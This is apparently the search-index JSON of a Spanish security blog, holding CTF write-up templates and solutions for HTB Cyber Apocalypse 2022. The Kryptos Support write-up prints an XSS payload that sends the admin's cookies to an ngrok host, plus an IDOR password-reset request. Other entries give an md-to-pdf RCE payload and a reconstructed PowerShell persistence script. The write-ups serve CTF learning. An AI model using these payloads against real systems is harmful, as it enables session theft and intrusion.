{"config":{"lang":["es"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Secronomic\u00f3n","text":"<p>Saludos, intr\u00e9pidos buscadores de lo arcano y lo cr\u00edptico, bienvenidos a los reinos sombr\u00edos del Secronomic\u00f3n. Mientras navegas por este santuario digital, te embarcas en un peligroso viaje a trav\u00e9s de los laber\u00ednticos corredores de la ciberseguridad, donde las fuerzas sobrenaturales del mundo digital acechan, esperando ser descubiertas.</p> <p>Al igual que las almas curiosas y atrevidas de mis cuentos que buscaban conocimientos prohibidos m\u00e1s all\u00e1 de los l\u00edmites del entendimiento humano, usted, querido lector, est\u00e1 a punto de embarcarse en su propia b\u00fasqueda. En los oscuros rincones de este blog, encontrar\u00e1 un dep\u00f3sito de desaf\u00edos enigm\u00e1ticos y soluciones cr\u00edpticas, similares a los antiguos tomos de sabidur\u00eda oculta que impregnan mis historias. Es un lugar donde la l\u00ednea entre la realidad y el reino virtual se desdibuja, donde lo arcano se encuentra con lo tecnol\u00f3gico y donde la frontera entre el conocimiento y la oscuridad cambia constantemente.</p> <p>El nombre Secronomic\u00f3n en s\u00ed mismo es un gui\u00f1o al nefasto y prohibido tomo de conocimiento sobrenatural que aparece ocasionalmente en mis cuentos, reflejando los misterios y secretos arcanos que esperan tu descubrimiento. En este grimorio moderno, no encontrar\u00e1s encantamientos para invocar seres de otro mundo, sino que descubrir\u00e1s los encantamientos de c\u00f3digo, los sigilos de cifrado y los rituales de defensa de la red.</p> <p>Como devoto practicante de las artes oscuras de la ciberseguridad y fiel admirador de mis propias historias de horror c\u00f3smico, est\u00e1s bien preparado para adentrarte en el abismo del Secronomic\u00f3n. Aqu\u00ed encontrar\u00e1 un tesoro de conocimientos, t\u00e9cnicas y soluciones a los enigmas que plagan el \u00e1mbito digital. Si usted es un profesional experimentado, un ne\u00f3fito curioso o simplemente un devoto de lo desconocido, est\u00e1 invitado a participar en el conocimiento sobrenatural contenido en estas p\u00e1ginas virtuales.</p> <p>As\u00ed que, querido viajero del cosmos virtual, presta atenci\u00f3n al llamado del Secronomic\u00f3n y que tu viaje a trav\u00e9s de los rincones cr\u00edpticos del ciberespacio sea esclarecedor y est\u00e9 envuelto en un aura de temor indescriptible. En este \u00e1mbito, como en mis cuentos, la frontera entre lo que se sabe y lo que permanece oculto es siempre fr\u00e1gil, y la b\u00fasqueda del conocimiento puede tener un precio tan enigm\u00e1tico como los secretos que revela.</p> <p>Howard GPT Lovecraft.</p>"},{"location":"templates/","title":"Templates","text":""},{"location":"templates/#box","title":"Box","text":""},{"location":"templates/#distribucion-de-archivos","title":"Distribuci\u00f3n de archivos","text":"<pre><code>Box\n\u251c\u2500\u2500 images\n\u2514\u2500\u2500 README.md\n</code></pre>"},{"location":"templates/#contenido-de-readmemd","title":"Contenido de <code>README.md</code>","text":"<pre><code># &lt;Box&gt; &lt;!-- omit from toc --&gt;\n\n*HackTheBox*\nWrite-up de la m\u00e1quina &lt;Box&gt; de [HackTheBox](https://hackthebox.com).\n\n*echoCTF*\nWrite-up de la m\u00e1quina &lt;box&gt; de [echoCTF](https://echoCTF.red).\n\n![Cover de &lt;Box&gt;](images/cover.png)\n\n## Tabla de Contenido &lt;!-- omit from toc --&gt;\n\n- [Introducci\u00f3n](#introducci\u00f3n)\n  - [T\u00e9cnicas vistas / Tags](#t\u00e9cnicas-vistas--tags)\n  - [Estad\u00edsticas](#estad\u00edsticas)\n- [Reconocimiento](#reconocimiento)\n  - [Escaneo de host](#escaneo-de-host)\n    - [Escaneo completo de puertos](#escaneo-completo-de-puertos)\n    - [Escaneo espec\u00edfico](#escaneo-espec\u00edfico)\n- [Enumeraci\u00f3n](#enumeraci\u00f3n)\n  - [Servicios](#servicios)\n    - [Nombre de servicio - Puerto](#nombre-de-servicio---puerto)\n      - [Manual](#manual)\n      - [Nombre de herramienta](#nombre-de-herramienta)\n- [Explotaci\u00f3n](#explotaci\u00f3n)\n  - [Tipo de explotaci\u00f3n](#tipo-de-explotaci\u00f3n)\n    - [Pasos previos | Preparaci\u00f3n](#pasos-previos--preparaci\u00f3n)\n    - [Ejecuci\u00f3n](#ejecuci\u00f3n)\n- [Post Explotaci\u00f3n](#post-explotaci\u00f3n)\n  - [Enumeraci\u00f3n](#enumeraci\u00f3n-1)\n  - [Escalaci\u00f3n de privilegios](#escalaci\u00f3n-de-privilegios)\n- [Conclusi\u00f3n](#conclusi\u00f3n)\n- [Notas adicionales](#notas-adicionales)\n- [Referencias](#referencias)\n\n\n## Introducci\u00f3n\n\n### T\u00e9cnicas vistas / Tags\n\n- T\u00e9cnica 1\n- T\u00e9cnica 2\n- T\u00e9cnica 3\n\n### Estad\u00edsticas\n\n*HackTheBox*\n\n| Caracter\u00edstica | Descripci\u00f3n |\n|---|---|\n| Nombre | [&lt;Box&gt;](https://app.hackthebox.com/machines/&lt;Box&gt;) |\n| OS | Windows / Linux |\n| Dificultad oficial | Easy |\n| Dificultad de comunidad | ![Dificultad](images/diff.png) |\n| Puntos | 20 |\n| Creadores | [Creator](https://app.hackthebox.com/users/Creator) |\n\n*echoCTF*\n\n| Caracter\u00edstica | Descripci\u00f3n |\n|---|---|\n| Nombre | [nombre](https://echoctf.red/target/) |\n| Dificultad | Expert |\n| Banderas | 11 (7: other, 2: system, env, root) |\n| Puntos | 6,600: (other: 1,600, system: 2,600, env: 900, root: 1,500) |\n| Descripci\u00f3n/Pistas |  |\n\n## Reconocimiento\n\n### Escaneo de host\n\n#### Escaneo completo de puertos\n\n```bash\nsudo nmap -T5 -open -vvv --min-rate=5000 -p- -n -Pn -oG nmap/all_ports $BOX_TARGET\n\n```\n\n#### Escaneo espec\u00edfico\n\n```bash\nnmap -sCV -p80,27017,37500 -oN nmap/targeted $BOX_TARGET\n\n```\n\n## Enumeraci\u00f3n\n\n### Servicios\n\n#### Nombre de servicio - Puerto\n\n##### Manual\n\n\n\n##### Nombre de herramienta\n\n\n\n## Explotaci\u00f3n\n\n### Tipo de explotaci\u00f3n\n\n#### Pasos previos | Preparaci\u00f3n\n\n\n\n#### Ejecuci\u00f3n\n\n\n\n## Post Explotaci\u00f3n\n\n### Enumeraci\u00f3n\n\n\n\n### Escalaci\u00f3n de privilegios\n\n\n## Conclusi\u00f3n\n\n\n## Notas adicionales\n\n\n## Referencias\n</code></pre>"},{"location":"templates/#compendio-ctf-writeup","title":"Compendio CTF / Writeup","text":"<pre><code># Nombre CTF\n\n## Tabla de Contenidos\n\n## Resumen de Vulnerabilidades\n\n## Web\n\n### Web Reto 1\n\n#### Info\n\n| Atributo | Valor |\n|---|---|\n| Descripci\u00f3n | - |\n| Archivos | - |\n\n#### Soluci\u00f3n\n\n## Crypto\n\n### Crypto Reto 1\n\n#### Info\n\n| Atributo | Valor |\n|---|---|\n| Descripci\u00f3n | - |\n| Archivos | - |\n\n#### Soluci\u00f3n\n\n## Reversing\n\n### Reversing Reto 1\n\n#### Info\n\n| Atributo | Valor |\n|---|---|\n| Descripci\u00f3n | - |\n| Archivos | - |\n\n#### Soluci\u00f3n\n\n## Pwning\n\n### Pwning Reto 1\n\n#### Info\n\n| Atributo | Valor |\n|---|---|\n| Descripci\u00f3n | - |\n| Archivos | - |\n\n#### Soluci\u00f3n\n\n## Forense\n\n### Forense Reto 1\n\n#### Info\n\n| Atributo | Valor |\n|---|---|\n| Descripci\u00f3n | - |\n| Archivos | - |\n\n#### Soluci\u00f3n\n</code></pre>"},{"location":"CTFs/HTB%20Cyber%20Apocalypse%202022/","title":"HTB Cyber Apocalypse CTF 2022","text":"<p>Cyber Apocalypse CTF 2022 - Intergalactic Chase</p> <p></p>","tags":["Stored XSS","IDOR","RCE (md-to-pdf)","Binary Analysis (IDA)","Microsoft Windows Event Logs Analysis (evtx)+","NTUSER.dat Analysis","GTFOBins (zip)"]},{"location":"CTFs/HTB%20Cyber%20Apocalypse%202022/#indice","title":"\u00cdndice","text":"<ul> <li>Intro</li> <li>Retos</li> <li>Web<ul> <li>Kryptos Support</li> <li>Stats</li> <li>Soluci\u00f3n</li> <li>BlinkerFluids</li> <li>Stats</li> <li>Soluci\u00f3n</li> </ul> </li> <li>Pwn<ul> <li>Space Pirate: Entrypoint</li> <li>Stats</li> <li>Soluci\u00f3n</li> </ul> </li> <li>Reversing<ul> <li>WIDE</li> <li>Stats</li> <li>Soluci\u00f3n</li> </ul> </li> <li>Forensics<ul> <li>Puppeteer</li> <li>Stats</li> <li>Soluci\u00f3n</li> <li>Golden Persistence</li> <li>Stats</li> <li>Soluci\u00f3n<ul> <li>Script completo</li> </ul> </li> </ul> </li> <li>Misc<ul> <li>Compressor</li> <li>Stats</li> <li>Soluci\u00f3n</li> <li>Composici\u00f3n</li> </ul> </li> </ul>","tags":["Stored XSS","IDOR","RCE (md-to-pdf)","Binary Analysis (IDA)","Microsoft Windows Event Logs Analysis (evtx)+","NTUSER.dat Analysis","GTFOBins (zip)"]},{"location":"CTFs/HTB%20Cyber%20Apocalypse%202022/#intro","title":"Intro","text":"<p>El CTF de Cyber Apocalypse volvi\u00f3 este a\u00f1o, bajo una tem\u00e1tica intergal\u00e1ctica estando disponible del 14 al 20 de Mayo del 2022. Mediante este enlace se puede obtener m\u00e1s informaci\u00f3n del evento.</p> <p>Aqu\u00ed se encuentran las soluciones de los retos que pude resolver durante mi participaci\u00f3n.</p> <p>El write-up aqu\u00ed presente fue generado por medio de CTFScrapper para la creaci\u00f3n de un entorno de trabajo y para la descarga de los archivos de los retos, disponibles en mi compendio de retos.</p>","tags":["Stored XSS","IDOR","RCE (md-to-pdf)","Binary Analysis (IDA)","Microsoft Windows Event Logs Analysis (evtx)+","NTUSER.dat Analysis","GTFOBins (zip)"]},{"location":"CTFs/HTB%20Cyber%20Apocalypse%202022/#retos","title":"Retos","text":"","tags":["Stored XSS","IDOR","RCE (md-to-pdf)","Binary Analysis (IDA)","Microsoft Windows Event Logs Analysis (evtx)+","NTUSER.dat Analysis","GTFOBins (zip)"]},{"location":"CTFs/HTB%20Cyber%20Apocalypse%202022/#web","title":"Web","text":"","tags":["Stored XSS","IDOR","RCE (md-to-pdf)","Binary Analysis (IDA)","Microsoft Windows Event Logs Analysis (evtx)+","NTUSER.dat Analysis","GTFOBins (zip)"]},{"location":"CTFs/HTB%20Cyber%20Apocalypse%202022/#kryptos-support","title":"Kryptos Support","text":"","tags":["Stored XSS","IDOR","RCE (md-to-pdf)","Binary Analysis (IDA)","Microsoft Windows Event Logs Analysis (evtx)+","NTUSER.dat Analysis","GTFOBins (zip)"]},{"location":"CTFs/HTB%20Cyber%20Apocalypse%202022/#stats","title":"Stats","text":"Attribute Info Difficulty easy Description The secret vault used by the Longhir's planet council, Kryptos, contains some very sensitive state secrets that Virgil and Ramona are after to prove the injustice performed by the commission. Ulysses performed an initial recon at their request and found a support portal for the vault. Can you take a look if you can infiltrate this system? File -","tags":["Stored XSS","IDOR","RCE (md-to-pdf)","Binary Analysis (IDA)","Microsoft Windows Event Logs Analysis (evtx)+","NTUSER.dat Analysis","GTFOBins (zip)"]},{"location":"CTFs/HTB%20Cyber%20Apocalypse%202022/#solucion","title":"Soluci\u00f3n","text":"<p>Despu\u00e9s de navegar y revisar el sitio disponible, dado que se menciona que el admin del sitio visualizar\u00e1 los tickets de servicio dados de alta, se puede suponer que se trata de un ataque XSS.</p> <p>Haciendo uso del payload:</p> <pre><code>&lt;img src=\"\" onerror=fetch(\"https://a748-189-203-27-57.ngrok.io/\"+document.cookie).then() /&gt;\n</code></pre> <p></p> <p>Con la intenci\u00f3n de robar una cookie de sesi\u00f3n correspondiente a la del admin, como lo menciona el sitio.</p> <p></p> <p>De acuerdo a como est\u00e1 construida la cookie, se identific\u00f3 que se trata de un JWT.</p> <p></p> <p>Al buscar m\u00e1s informaci\u00f3n siendo que con la cookie de sesi\u00f3n no revela ning\u00fan cambio al utilizarla se identific\u00f3 en el c\u00f3digo fuente de <code>http://&lt;challenge url&gt;/login</code> se revela un directorio disponible haciendo uso de la cookie obtenida.</p> <p></p> <p><code>login.js</code></p> <p></p> <p>Vista de <code>http://&lt;challenge url&gt;/tickets</code> haciendo uso de la cookie obtenida.</p> <p></p> <p>Vista de <code>http://&lt;challenge url&gt;/settings</code> haciendo uso de la cookie obtenida. Exponiendo la funcionalidad del cambio de contrase\u00f1a del \"usuario logueado\".</p> <p></p> <p></p> <p>Al visualizar el c\u00f3digo se puede identificar que el par\u00e1metro <code>uid</code> es enviado al hacer uso de la funcionalidad.</p> <p></p> <p>Buscando invocar la funcionalidad haciendo uso de <code>curl</code> se envi\u00f3 el uid del moderador como prueba.</p> <pre><code>curl -v http://13868188223:30914/api/users/update -X POST -H \"Content-Type: application/json\" -d '{\"password\":\"123456\",\"uid\":100}' --cookie \"session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im1vZGVyYXRvciIsInVpZCI6MTAwLCJpYXQiOjE2NTI2NDYxMzd9Z.HRsjja_ehTEx7FxfjilkTjO3_gRsHkt_jmovFZY1OA\"\n</code></pre> <p></p> <p>Habi\u00e9ndo mencionado que se env\u00eda el <code>uid</code> en la petici\u00f3n, se decidi\u00f3 cambiar el varlor a 1 siendo que generalmente se reserva ese id para administradores.</p> <p></p> <p>Al haber sido satisfactorio el cambio de contrase\u00f1a se puede realizar el login como admin, obteniendo de esta manera la bandera.</p> <p></p> <p>Flag: HTB{x55_4nd_id0rs_ar3_fun!!}</p>","tags":["Stored XSS","IDOR","RCE (md-to-pdf)","Binary Analysis (IDA)","Microsoft Windows Event Logs Analysis (evtx)+","NTUSER.dat Analysis","GTFOBins (zip)"]},{"location":"CTFs/HTB%20Cyber%20Apocalypse%202022/#blinkerfluids","title":"BlinkerFluids","text":"","tags":["Stored XSS","IDOR","RCE (md-to-pdf)","Binary Analysis (IDA)","Microsoft Windows Event Logs Analysis (evtx)+","NTUSER.dat Analysis","GTFOBins (zip)"]},{"location":"CTFs/HTB%20Cyber%20Apocalypse%202022/#stats_1","title":"Stats","text":"Attribute Info Difficulty easy Description Once known as an imaginary liquid used in automobiles to make the blinkers work is now one of the rarest fuels invented on Klaus' home planet Vinyr. The Golden Fang army has a free reign over this miraculous fluid essential for space travel thanks to the Blinker Fluids\u2122 Corp. Ulysses has infiltrated this supplier organization's one of the HR department tools and needs your help to get into their server. Can you help him? File web_blinkerfluids.zip","tags":["Stored XSS","IDOR","RCE (md-to-pdf)","Binary Analysis (IDA)","Microsoft Windows Event Logs Analysis (evtx)+","NTUSER.dat Analysis","GTFOBins (zip)"]},{"location":"CTFs/HTB%20Cyber%20Apocalypse%202022/#solucion_1","title":"Soluci\u00f3n","text":"<p>Despu\u00e9s de identificar la composici\u00f3n del c\u00f3digo se encontr\u00f3 que:</p> <ul> <li>La bandera se encontraba en <code>/flag.txt</code>.</li> <li>Una librer\u00eda empleada es vulnerable a RCE (md-to-pdf).</li> <li>Por la configuaci\u00f3n de la aplicaci\u00f3n, s\u00f3lo se permit\u00eda la obtenci\u00f3n de archivos en el directorio <code>/static/invoices/</code>.</li> </ul> <p>Al capturar el contenido enviado se utiliz\u00f3 el siguiente payload como cuerpo del archivo markdown:</p> <pre><code>---js\\n((require(\\\"child_process\\\"))execSync(\\\"cp /flag.txt /static/invoices/flag.txt\\\"))\\n---RCE\n</code></pre> <p></p> <p>Ejecutando as\u00ed el payload y permitiendo navegar a donde se encuentra la bandera</p> <p></p> <p>Flag: HTB{bl1nk3r_flu1d_f0r_int3rG4l4c7iC_tr4v3ls}</p>","tags":["Stored XSS","IDOR","RCE (md-to-pdf)","Binary Analysis (IDA)","Microsoft Windows Event Logs Analysis (evtx)+","NTUSER.dat Analysis","GTFOBins (zip)"]},{"location":"CTFs/HTB%20Cyber%20Apocalypse%202022/#pwn","title":"Pwn","text":"","tags":["Stored XSS","IDOR","RCE (md-to-pdf)","Binary Analysis (IDA)","Microsoft Windows Event Logs Analysis (evtx)+","NTUSER.dat Analysis","GTFOBins (zip)"]},{"location":"CTFs/HTB%20Cyber%20Apocalypse%202022/#space-pirate-entrypoint","title":"Space Pirate: Entrypoint","text":"","tags":["Stored XSS","IDOR","RCE (md-to-pdf)","Binary Analysis (IDA)","Microsoft Windows Event Logs Analysis (evtx)+","NTUSER.dat Analysis","GTFOBins (zip)"]},{"location":"CTFs/HTB%20Cyber%20Apocalypse%202022/#stats_2","title":"Stats","text":"Attribute Info Difficulty easy Description D12 is one of Golden Fang's missile launcher spaceships. Our mission as space pirates is to highjack D12, get inside the control panel room, and access the missile launcher system. To achieve our goal, we split the mission into three parts. In this part, all we need to do is bypass the scanning system and open the gates so that we proceed further. File pwn_sp_entrypoint.zip","tags":["Stored XSS","IDOR","RCE (md-to-pdf)","Binary Analysis (IDA)","Microsoft Windows Event Logs Analysis (evtx)+","NTUSER.dat Analysis","GTFOBins (zip)"]},{"location":"CTFs/HTB%20Cyber%20Apocalypse%202022/#solucion_2","title":"Soluci\u00f3n","text":"<p>Con los archivos que disponibles se prob\u00f3 localmente el binario y a modo de prueba y error, se identific\u00f3 que al hacer uso de la contrase\u00f1a <code>1234</code> el binario lee los contenidos del archivo local <code>flag.txt</code>.</p> <pre><code>1 Scan card \ud83d\udcb3\n2 Insert password \u21aa\ufe0f\n&gt; 2\n[*] Insert password: 1234\n\n[+] Door opened, you can proceed with the passphrase: HTB{f4k3_fl4g_4_t35t1ng}\n\n[-] Invalid option! Intruder detected! \ud83d\udea8 \ud83d\udea8\n</code></pre> <p>Por lo que de la misma manera se realiz\u00f3 el mismo proceso en la conexi\u00f3n remota disponible.</p> <pre><code>1 Scan card \ud83d\udcb3\n2 Insert password \u21aa\ufe0f\n&gt; 2\n[*] Insert password: 1234\n\n[+] Door opened, you can proceed with the passphrase: HTB{th3_g4t35_4r3_0p3n!}\n[-] Invalid option! Intruder detected! \ud83d\udea8 \ud83d\udea8\n</code></pre> <p>Flag: HTB{th3_g4t35_4r3_0p3n!}</p>","tags":["Stored XSS","IDOR","RCE (md-to-pdf)","Binary Analysis (IDA)","Microsoft Windows Event Logs Analysis (evtx)+","NTUSER.dat Analysis","GTFOBins (zip)"]},{"location":"CTFs/HTB%20Cyber%20Apocalypse%202022/#reversing","title":"Reversing","text":"","tags":["Stored XSS","IDOR","RCE (md-to-pdf)","Binary Analysis (IDA)","Microsoft Windows Event Logs Analysis (evtx)+","NTUSER.dat Analysis","GTFOBins (zip)"]},{"location":"CTFs/HTB%20Cyber%20Apocalypse%202022/#wide","title":"WIDE","text":"","tags":["Stored XSS","IDOR","RCE (md-to-pdf)","Binary Analysis (IDA)","Microsoft Windows Event Logs Analysis (evtx)+","NTUSER.dat Analysis","GTFOBins (zip)"]},{"location":"CTFs/HTB%20Cyber%20Apocalypse%202022/#stats_3","title":"Stats","text":"Attribute Info Difficulty easy Description We've received reports that Draeger has stashed a huge arsenal in the pocket dimension Flaggle Alpha. You've managed to smuggle a discarded access terminal to the Widely Inflated Dimension Editor from his headquarters, but the entry for the dimension has been encrypted. Can you make it inside and take control? File rev_wide.zip","tags":["Stored XSS","IDOR","RCE (md-to-pdf)","Binary Analysis (IDA)","Microsoft Windows Event Logs Analysis (evtx)+","NTUSER.dat Analysis","GTFOBins (zip)"]},{"location":"CTFs/HTB%20Cyber%20Apocalypse%202022/#solucion_3","title":"Soluci\u00f3n","text":"<p>Despu\u00e9s de interactuar con el binario y ver las posibilidades ofrecidas, la opci\u00f3n que se visualiza como cifrada pide una contrase\u00f1a para visualizar su contenido.</p> <p></p> <p>Buscando el valor en duro mediante su ejecuci\u00f3n en IDA, al revisar el flujo se puede ver un valor posible que pudiera ser usado como contrase\u00f1a.</p> <p></p> <p>Obteniendo el valor: <code>sup3rs3cr3tw1d3</code>.</p> <p>Y al pasarse como contrase\u00f1a, se obtuvo la bandera.</p> <p></p> <p>Flag: HTB{str1ngs_4r3nt_4lw4ys_4sc11}</p>","tags":["Stored XSS","IDOR","RCE (md-to-pdf)","Binary Analysis (IDA)","Microsoft Windows Event Logs Analysis (evtx)+","NTUSER.dat Analysis","GTFOBins (zip)"]},{"location":"CTFs/HTB%20Cyber%20Apocalypse%202022/#forensics","title":"Forensics","text":"","tags":["Stored XSS","IDOR","RCE (md-to-pdf)","Binary Analysis (IDA)","Microsoft Windows Event Logs Analysis (evtx)+","NTUSER.dat Analysis","GTFOBins (zip)"]},{"location":"CTFs/HTB%20Cyber%20Apocalypse%202022/#puppeteer","title":"Puppeteer","text":"","tags":["Stored XSS","IDOR","RCE (md-to-pdf)","Binary Analysis (IDA)","Microsoft Windows Event Logs Analysis (evtx)+","NTUSER.dat Analysis","GTFOBins (zip)"]},{"location":"CTFs/HTB%20Cyber%20Apocalypse%202022/#stats_4","title":"Stats","text":"Attribute Info Difficulty easy Description Planet Longhir is known for it's top-tier researchers. Due to their dedication in science and engineering, their military equipment is the most advanced one in the galaxy. In fact, the prototype DES-3000, a self-propelled precision-strike missile that is capable of reaching targets even in Ratnik galaxy, is being used to disable Galactic Federation's communication satellites. The mystery that Miyuki is trying to solve is, how the satellite's location was leaked since it is a top-sercret that only Galactic Federation's council is aware of. Help her analyse the Council's HQ event logs and solve this mystery. File forensics_puppeteer.zip","tags":["Stored XSS","IDOR","RCE (md-to-pdf)","Binary Analysis (IDA)","Microsoft Windows Event Logs Analysis (evtx)+","NTUSER.dat Analysis","GTFOBins (zip)"]},{"location":"CTFs/HTB%20Cyber%20Apocalypse%202022/#solucion_4","title":"Soluci\u00f3n","text":"<p>Se uso como base la soluci\u00f3n de un reto similar que anteriormente HackTheBox hab\u00eda publicado, que fue encontrado al buscar como realizar an\u00e1lisis a los tipos de archivos dados.</p> <p>Al revisar el mismo archivo indicado en el writeup (<code>Microsoft-Windows-PowerShell%4Operationalevtx</code>), que por suerte, tambi\u00e9n existe en los logs de eventos, se puede visualizar una serie de eventos que tienen que ver con la descripci\u00f3n del reto (contexto del evento).</p> <p></p> <p>En uno de ellos se encuentra algo que por su composici\u00f3n se asume que es shellcode, al tratar de interpretar que es lo realiza antes de ejecutarse se puede visualizar que el c\u00f3digo concatena dos arreglos de bytes declarados antes del shellcode asignando este nuevo valor a otra variable y posteriormente realiza un XOR a cada elemento con <code>0xd1</code></p> <p></p> <ol> <li>Declaraci\u00f3n de stages</li> <li>Concatenaci\u00f3n</li> <li>XOR a cada elemento</li> </ol> <p>Se imprimi\u00f3 esta variable para saber su contenido, el cual, al decodearse de los decimales obtenidos a ascii se obtuvo la bandera, haciendo uso de esta receta de CyberChef.</p> <p>Modificaci\u00f3n a script original:</p> <p></p> <p>Ejecuci\u00f3n:</p> <p></p> <p>Decodeo de valores obtenidos para obtener bandera:</p> <p></p> <p>Flag: HTB{b3wh4r3_0f_th3_b00t5_0f_just1c3}</p>","tags":["Stored XSS","IDOR","RCE (md-to-pdf)","Binary Analysis (IDA)","Microsoft Windows Event Logs Analysis (evtx)+","NTUSER.dat Analysis","GTFOBins (zip)"]},{"location":"CTFs/HTB%20Cyber%20Apocalypse%202022/#golden-persistence","title":"Golden Persistence","text":"","tags":["Stored XSS","IDOR","RCE (md-to-pdf)","Binary Analysis (IDA)","Microsoft Windows Event Logs Analysis (evtx)+","NTUSER.dat Analysis","GTFOBins (zip)"]},{"location":"CTFs/HTB%20Cyber%20Apocalypse%202022/#stats_5","title":"Stats","text":"Attribute Info Difficulty easy Description Emergency! A space station near Urkir was compromised. Although Urkir is considered to be the very embodiment of the neutral state, it is rich of fuel substances, something that Dreager is very much interested in. Thus, there are now fears that the intergalactic war will also affect this neutral planet. If Draeger and his mercenaries manage to maintain unauthorised access in Urkir's space station and escalate their privileges, they will soon be able to activate the station's defence mechanisms that are able to prevent any spaceship from entering Urkir's airspace. For now, the infected machine is isolated until the case is closed. Help Miyuki find their persistence mechanisms so they cannot gain access again. File forensics_golden_persistence.zip","tags":["Stored XSS","IDOR","RCE (md-to-pdf)","Binary Analysis (IDA)","Microsoft Windows Event Logs Analysis (evtx)+","NTUSER.dat Analysis","GTFOBins (zip)"]},{"location":"CTFs/HTB%20Cyber%20Apocalypse%202022/#solucion_5","title":"Soluci\u00f3n","text":"<p>Despu\u00e9s de investigar acerca del an\u00e1lisis del archivo dado (<code>NTUSER.dat</code>), se encontr\u00f3 este write-up en el que se hace uso de diferentes herramientas para an\u00e1lizar y navegar entre los registros del archivo, del cu\u00e1l en el registro <code>/Software/Microsoft/Windows/CurrentVersion/Run</code> se identific\u00f3 el uso de powershell con un par\u00e1metro poco convencional. Haciendo uso de <code>reglookup -p /Software/Microsoft/Windows/CurrentVersion/Run NTUSER.DAT</code>.</p> <p></p> <p>Despu\u00e9s de identificar que el par\u00e1metro se encontraba codificado en base64 y desencode\u00e1ndolo, se puede visualizar el script utilizado.</p> <p></p> <p>De acuerdo al c\u00f3digo, el script hace uso de los valores de los registros indicados por lo que en pasos consiguientes fue necesario buscar los mismos.</p> <p></p> <p>Extrayendo de la misma manera los valores se pueden sustituir las variables correspondientes directamente.</p> <p></p> <p>Al ejecutar la reconstrucci\u00f3n del script, a\u00fan presentaba inconsistencias de sintaxis, al limpiarlo para buscar una ejecuci\u00f3n correcta qued\u00f3 de la siguiente manera</p> <p></p>","tags":["Stored XSS","IDOR","RCE (md-to-pdf)","Binary Analysis (IDA)","Microsoft Windows Event Logs Analysis (evtx)+","NTUSER.dat Analysis","GTFOBins (zip)"]},{"location":"CTFs/HTB%20Cyber%20Apocalypse%202022/#script-completo","title":"Script completo","text":"<pre><code>function encr {\n    param(\n        [Byte[]]$data,\n        [Byte[]]$key\n      )\n\n    [Byte[]]$buffer = New-Object Byte[] $data.Length\n    $data.CopyTo($buffer, 0)\n\n    [Byte[]]$s = New-Object Byte[] 256;\n    [Byte[]]$k = New-Object Byte[] 256;\n\n    for ($i = 0; $i -lt 256; $i++)\n    {\n        $s[$i] = [Byte]$i;\n        $k[$i] = $key[$i % $key.Length];\n    }\n\n    $j = 0;\n    for ($i = 0; $i -lt 256; $i++)\n    {\n        $j = ($j + $s[$i] + $k[$i]) % 256;\n        $temp = $s[$i];\n        $s[$i] = $s[$j];\n        $s[$j] = $temp;\n    }\n\n    $i = $j = 0;\n    for ($x = 0; $x -lt $buffer.Length; $x++)\n    {\n        $i = ($i + 1) % 256;\n        $j = ($j + $s[$i]) % 256;\n        $temp = $s[$i];\n        $s[$i] = $s[$j];\n        $s[$j] = $temp;\n        [int]$t = ($s[$i] + $s[$j]) % 256;\n        $buffer[$x] = $buffer[$x] -bxor $s[$t];\n    }\n\n    return $buffer\n}\n\n\nfunction HexToBin {\n    param(\n    [Parameter(\n        Position=0,\n        Mandatory=$true,\n        ValueFromPipeline=$true)\n    ]\n    [string]$s)\n    $return = @()\n\n    for ($i = 0; $i -lt $s.Length ; $i += 2)\n    {\n        $return += [Byte]::Parse($s.Substring($i, 2), [System.Globalization.NumberStyles]::HexNumber)\n    }\n\n    Write-Output $return\n}\n\n$enc = [System.Text.Encoding]::ASCII\n[Byte[]]$key = $enc.GetBytes(\"Q0mmpr4B5rvZi3pS\")\n#$encrypted1 = (Get-ItemProperty -Path HKCU:\\SOFTWARE\\ZYb78P4s).t3RBka5tL\n#$encrypted2 = (Get-ItemProperty -Path HKCU:\\SOFTWARE\\BjqAtIen).uLltjjW\n#$encrypted3 = (Get-ItemProperty -Path HKCU:\\SOFTWARE\\AppDataLow\\t03A1Stq).uY4S39Da\n#$encrypted4 = (Get-ItemProperty -Path HKCU:\\SOFTWARE\\Google\\Nv50zeG).Kb19fyhl\n#$encrypted5 = (Get-ItemProperty -Path HKCU:\\AppEvents\\Jx66ZG0O).jH54NW8C\n$encrypted1 = \"F844A6035CF27CC4C90DFEAF579398BE6F7D5ED10270BD12A661DAD04191347559B82ED546015B07317000D8909939A4DA7953AED8B83C0FEE4EB6E120372F536BC5DC39\"\n$encrypted2 = \"CC19F66A5F3B2E36C9B810FE7CC4D9CE342E8E00138A4F7F5CDD9EED9E09299DD7C6933CF4734E12A906FD9CE1CA57D445DB9CABF850529F5845083F34BA1\"\n$encrypted3 = \"C08114AA67EB979D36DC3EFA0F62086B947F672BD8F966305A98EF93AA39076C3726B0EDEBFA10811A15F1CF1BEFC78AFC5E08AD8CACDB323F44B4D\"\n$encrypted4 = \"D814EB4E244A153AF8FAA1121A5CCFD0FEAC8DD96A9B31CCF6C3E3E03C1E93626DF5B3E0B141467116CC08F92147F7A0BE0D95B0172A7F34922D6C236BC7DE54D8ACBFA70D1\"\n$encrypted5 = \"84AB553E67C743BE696A0AC80C16E2B354C2AE7918EE08A0A3887875C83E44ACA7393F1C579EE41BCB7D336CAF8695266839907F47775F89C1F170562A6B0A01C0F3BC4CB\"\n$encrypted = \"$($encrypted1)$($encrypted2)$($encrypted3)$($encrypted4)$($encrypted5)\"\n[Byte[]]$data = HexToBin $encrypted\n$DecryptedBytes = encr $data $key\n$DecryptedString = $enc.GetString($DecryptedBytes)\n$DecryptedString\n#$DecryptedString|iex\n</code></pre> <p>Del cu\u00e1l al ejecutarse se obtiene el valor original del par\u00e1metro ejecutado, encontrando de esta manera la bandera.</p> <p></p> <p>Flag: HTB{g0ld3n_F4ng_1s_n0t_st34lthy_3n0ugh}</p>","tags":["Stored XSS","IDOR","RCE (md-to-pdf)","Binary Analysis (IDA)","Microsoft Windows Event Logs Analysis (evtx)+","NTUSER.dat Analysis","GTFOBins (zip)"]},{"location":"CTFs/HTB%20Cyber%20Apocalypse%202022/#misc","title":"Misc","text":"","tags":["Stored XSS","IDOR","RCE (md-to-pdf)","Binary Analysis (IDA)","Microsoft Windows Event Logs Analysis (evtx)+","NTUSER.dat Analysis","GTFOBins (zip)"]},{"location":"CTFs/HTB%20Cyber%20Apocalypse%202022/#compressor","title":"Compressor","text":"","tags":["Stored 